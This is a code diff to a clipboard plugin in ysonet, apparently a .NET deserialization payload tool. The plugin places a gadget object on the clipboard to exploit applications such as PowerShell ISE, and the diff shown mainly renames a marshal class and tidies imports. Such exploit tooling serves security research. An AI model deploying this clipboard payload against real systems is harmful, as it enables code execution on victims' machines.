@@ -1,12 +1,9 @@
-﻿using System.Collections.Generic;
-using NDesk.Options;
+﻿using NDesk.Options;
 using System;
-using ysonet.Generators;
-using System.IO;
-using System.Runtime.Serialization;
-using System.Runtime.Serialization.Formatters.Binary;
-using System.Windows.Forms;
+using System.Collections.Generic;
 using System.Threading;
+using System.Windows.Forms;
+using ysonet.Generators;
 using ysonet.Helpers;
 
 /**
@@ -16,7 +13,7 @@ using ysonet.Helpers;
  *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
  *  See `DataObject.SetData Method`: https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.dataobject.setdata 
  *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
- *  It was possible to copy other objects into the clipboard but this plugin only utilises one method that is used in the DataSetMarshal class
+ *  It was possible to copy other objects into the clipboard but this plugin only utilises one method that is used in the DataSetBinaryMarshal class
  *  The object will be copied to the clipboard and can be pasted into other affected applications such as Windows PowerShell ISE
  *  This PoC produces an error and may crash the application
  **/
@@ -101,7 +98,7 @@ namespace ysonet.Plugins
                 myDataObject.SetData(format, false, new AxHostStateMarshal(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs))); // for System.Windows.Forms
 
                 /*
-                myDataObject.SetData(format, new DataSetMarshal(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)), false); // for System.Windows
+                myDataObject.SetData(format, new DataSetBinaryMarshal(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)), false); // for System.Windows
                 */
 
                 Clipboard.Clear();
